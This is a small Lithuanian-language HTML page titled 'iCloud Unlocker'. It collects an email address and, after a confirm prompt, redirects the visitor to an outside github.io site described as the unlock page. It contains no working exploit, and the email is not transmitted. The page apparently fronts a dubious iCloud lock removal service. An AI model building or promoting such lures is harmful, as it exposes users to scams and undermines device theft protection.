<!DOCTYPE html>
<html lang="lt">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>iCloud Unlocker</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(to bottom, #f0f0f0, #dfe9f3);
      text-align: center;
      padding: 50px;
    }
    .container {
      background: white;
      border-radius: 12px;
      padding: 40px;
      max-width: 400px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    input[type="email"] {
      width: 80%;
      padding: 12px;
      margin: 20px 0;
      border-radius: 8px;
      border: 1px solid #ccc;
      font-size: 16px;
    }
    button {
      background-color: #007aff;
      color: white;
      padding: 12px 24px;
      font-size: 16px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
    button:hover {
      background-color: #005ecb;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>iCloud Unlocker</h1>
    <p>Įveskite savo el. pašto adresą norėdami pradėti atrakinimą</p>
    <input type="email" id="email" placeholder="Įveskite el. paštą">
    <br>
    <button onclick="confirmRedirect()">Prašyti atrakinimo</button>
  </div>

  <script>
    function confirmRedirect() {
      const email = document.getElementById('email').value;
      if (!email) {
        alert("Įveskite galiojantį el. pašto adresą.");
        return;
      }
      if (confirm("Patvirtinti el. pašto adresą ir pereiti į atrakinimo puslapį?")) {
        window.location.href = "https://iosmetalab.github.io/";
      }
    }
  </script>
</body>
</html>
